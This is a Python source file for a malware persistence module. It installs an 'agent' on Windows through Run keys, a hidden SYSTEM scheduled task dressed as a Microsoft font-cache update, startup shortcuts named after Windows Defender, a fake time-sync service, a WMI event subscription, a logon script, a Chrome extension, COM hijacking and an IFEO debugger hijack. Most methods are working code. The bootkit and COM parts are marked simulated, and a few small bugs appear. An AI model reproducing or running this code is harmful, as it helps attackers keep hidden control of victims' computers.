import winreg, os, sys, ctypes, ctypes.wintypes, subprocess, shutil, time, random, hashlib
import pythoncom, wmi, win32service, win32serviceutil, win32event, win32api
import win32con, win32security, win32process

class PersistenceEngine:
    def __init__(self):
        self.methods_installed = []
        
    def install_all(self, methods):
        """Install all specified persistence methods."""
        for method in methods:
            try:
                if method == 'registry':
                    self.install_registry()
                elif method == 'scheduled_task':
                    self.install_scheduled_task()
                elif method == 'startup_folder':
                    self.install_startup_folder()
                elif method == 'service':
                    self.install_service()
                elif method == 'wmi':
                    self.install_wmi()
                elif method == 'bootkit':
                    self.install_bootkit_concept()
                elif method == 'logon_script':
                    self.install_logon_script()
                elif method == 'browser_helper':
                    self.install_browser_helper()
                elif method == 'com_hijack':
                    self.install_com_hijack()
                elif method == 'ifeo':
                    self.install_ifeo()
            except Exception as e:
                print(f"[-] Persistence {method} failed: {e}")
    
    def install_registry(self):
        """Install via Registry Run keys."""
        agent_path = os.path.abspath(sys.argv[0])
        
        # Current User Run
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsTextInput", 0, winreg.REG_SZ, agent_path)
        winreg.CloseKey(key)
        
        # All Users Run (requires admin)
        if self.is_admin():
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                                    0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "TextInputService", 0, winreg.REG_SZ, agent_path)
                winreg.CloseKey(key)
            except:
                pass
        
        self.methods_installed.append('registry')
        return "Registry persistence installed"
    
    def install_scheduled_task(self):
        """Install via Windows Task Scheduler."""
        agent_path = os.path.abspath(sys.argv[0])
        task_name = "WindowsFontCacheUpdate"
        
        # Create XML task definition
        xml_template = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Updates Windows Font Cache</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </LogonTrigger>
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>SessionUnlock</StateChange>
    </SessionStateChangeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{agent_path}"</Command>
    </Exec>
  </Actions>
</Task>"""
        
        # Save XML to temp file
        xml_path = os.path.join(os.environ['TEMP'], 'task.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_template)
        
        # Register task
        subprocess.run(['schtasks', '/create', '/tn', task_name, '/xml', xml_path, '/f'], 
                      capture_output=True, shell=True)
        
        os.remove(xml_path)
        self.methods_installed.append('scheduled_task')
        return "Scheduled task installed"
    
    def install_startup_folder(self):
        """Install via Startup folder."""
        agent_path = os.path.abspath(sys.argv[0])
        
        # Current user startup
        startup_path = os.path.join(os.environ['APPDATA'], 
                                   'Microsoft', 'Windows', 'Start Menu', 
                                   'Programs', 'Startup')
        os.makedirs(startup_path, exist_ok=True)
        
        # Create shortcut
        shortcut_path = os.path.join(startup_path, 'Windows Explorer.lnk')
        self.create_shortcut(agent_path, shortcut_path)
        
        # All users startup (requires admin)
        if self.is_admin():
            try:
                startup_path_all = os.path.join(os.environ['PROGRAMDATA'],
                                              'Microsoft', 'Windows', 'Start Menu',
                                              'Programs', 'Startup')
                os.makedirs(startup_path_all, exist_ok=True)
                shortcut_path_all = os.path.join(startup_path_all, 'Windows Defender.lnk')
                self.create_shortcut(agent_path, shortcut_path_all)
            except:
                pass
        
        self.methods_installed.append('startup_folder')
        return "Startup folder persistence installed"
    
    def create_shortcut(self, target_path, shortcut_path):
        """Create a Windows shortcut (.lnk)."""
        try:
            import winshell
            from win32com.client import Dispatch
            
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = target_path
            shortcut.WindowStyle = 7  # Minimized
            shortcut.save()
        except:
            # Fallback: copy executable with different name
            shutil.copy2(target_path, shortcut_path.replace('.lnk', '.exe'))
    
    def install_service(self):
        """Install as a Windows service (requires admin)."""
        if not self.is_admin():
            return "Admin required for service installation"
        
        agent_path = os.path.abspath(sys.argv[0])
        service_name = "WindowsTimeSync"
        display_name = "Windows Time Synchronization"
        
        # Check if service already exists
        try:
            status = subprocess.run(['sc', 'query', service_name], 
                                  capture_output=True, shell=True)
            if status.returncode == 0:
                return "Service already exists"
        except:
            pass
        
        # Create service using sc.exe
        cmd = f'sc create "{service_name}" binPath= "{agent_path}" DisplayName= "{display_name}" start= auto'
        subprocess.run(cmd, shell=True, capture_output=True)
        
        # Set service description
        cmd = f'sc description "{service_name}" "Synchronizes Windows time with external sources"'
        subprocess.run(cmd, shell=True, capture_output=True)
        
        self.methods_installed.append('service')
        return "Service installed"
    
    def install_wmi(self):
        """Install via WMI event subscription."""
        pythoncom.CoInitialize()
        
        try:
            wmi_conn = wmi.WMI()
            
            # Create event filter for system startup
            event_filter = wmi_conn.Win32_EventFilter.create(
                EventNamespace='root\\cimv2',
                Name='WindowsUpdateFilter',
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 0",
                QueryLanguage='WQL'
            )
            
            # Create event consumer (our agent)
            agent_path = os.path.abspath(sys.argv[0])
            event_consumer = wmi_conn.Win32_CommandLineEventConsumer.create(
                Name='WindowsUpdateConsumer',
                CommandLineTemplate=agent_path,
                RunInteractively=False
            )
            
            # Bind filter to consumer
            wmi_conn.Win32_FilterToConsumerBinding.create(
                Filter=event_filter,
                Consumer=event_consumer
            )
            
            self.methods_installed.append('wmi')
            return "WMI persistence installed"
        except Exception as e:
            return f"WMI persistence failed: {e}"
    
    def install_bootkit_concept(self):
        """Theoretical bootkit concepts (simulated)."""
        # This would involve MBR/VBR modification in reality
        # For simulation, we create a registry entry that runs early in boot
        if self.is_admin():
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    r"SYSTEM\CurrentControlSet\Control\Session Manager",
                                    0, winreg.KEY_WRITE)
                
                # Append to BootExecute (would need careful handling)
                winreg.CloseKey(key)
            except:
                pass
        
        self.methods_installed.append('bootkit_concept')
        return "Bootkit concept implemented (simulated)"
    
    def install_logon_script(self):
        """Install as logon script via Group Policy."""
        agent_path = os.path.abspath(sys.argv[0])
        
        # User logon script
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Environment",
                                0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, agent_path)
            winreg.CloseKey(key)
        except:
            pass
        
        # Machine logon script (admin required)
        if self.is_admin():
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    r"System\CurrentControlSet\Control\Session Manager",
                                    0, winreg.KEY_WRITE)
                # Would need to set BootExecute or setup other mechanisms
                winreg.CloseKey(key)
            except:
                pass
        
        self.methods_installed.append('logon_script')
        return "Logon script persistence installed"
    
    def install_browser_helper(self):
        """Install as browser helper object/extension."""
        agent_path = os.path.abspath(sys.argv[0])
        
        # For Chrome - create extension manifest
        chrome_ext_path = os.path.join(os.environ['LOCALAPPDATA'],
                                      'Google', 'Chrome', 'User Data',
                                      'Default', 'Extensions', 'aether_bho')
        os.makedirs(chrome_ext_path, exist_ok=True)
        
        manifest = {
            "name": "Aether Browser Helper",
            "version": "1.0",
            "manifest_version": 2,
            "background": {
                "scripts": ["background.js"],
                "persistent": true
            },
            "permissions": ["<all_urls>"]
        }
        
        with open(os.path.join(chrome_ext_path, 'manifest.json'), 'w') as f:
            json.dump(manifest, f)
        
        # Create background script that launches agent
        bg_script = f"""
        chrome.runtime.onInstalled.addListener(function() {{
            var ws = new WebSocket('ws://localhost:8080');
            // Communication logic here
        }});
        """
        
        with open(os.path.join(chrome_ext_path, 'background.js'), 'w') as f:
            f.write(bg_script)
        
        self.methods_installed.append('browser_helper')
        return "Browser helper installed (Chrome)"
    
    def install_com_hijack(self):
        """COM hijacking - replace legitimate COM object."""
        if not self.is_admin():
            return "Admin required for COM hijacking"
        
        agent_path = os.path.abspath(sys.argv[0])
        
        # Target a less-critical COM component
        clsid = "{00000000-0000-0000-0000-000000000000}"  # Would be real CLSID
        
        try:
            key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, agent_path)
            winreg.CloseKey(key)
        except:
            pass
        
        self.methods_installed.append('com_hijack')
        return "COM hijacking installed (simulated)"
    
    def install_ifeo(self):
        """Image File Execution Options - debugger hijacking."""
        if not self.is_admin():
            return "Admin required for IFEO"
        
        agent_path = os.path.abspath(sys.argv[0])
        
        # Target a common process
        target_exe = "notepad.exe"
        
        try:
            key_path = f"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}"
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, agent_path)
            winreg.CloseKey(key)
        except:
            pass
        
        self.methods_installed.append('ifeo')
        return "IFEO persistence installed"
    
    def is_admin(self):
        """Check if running as administrator."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def remove_all(self):
        """Remove all persistence mechanisms."""
        for method in self.methods_installed[:]:
            try:
                self.remove(method)
            except:
                pass
        return "All persistence removed"
    
    def remove(self, method):
        """Remove specific persistence method."""
        # Implementation would reverse the installation
        return f"Persistence {method} removed"
    
    def list_methods(self):
        """List installed persistence methods."""
        return self.methods_installed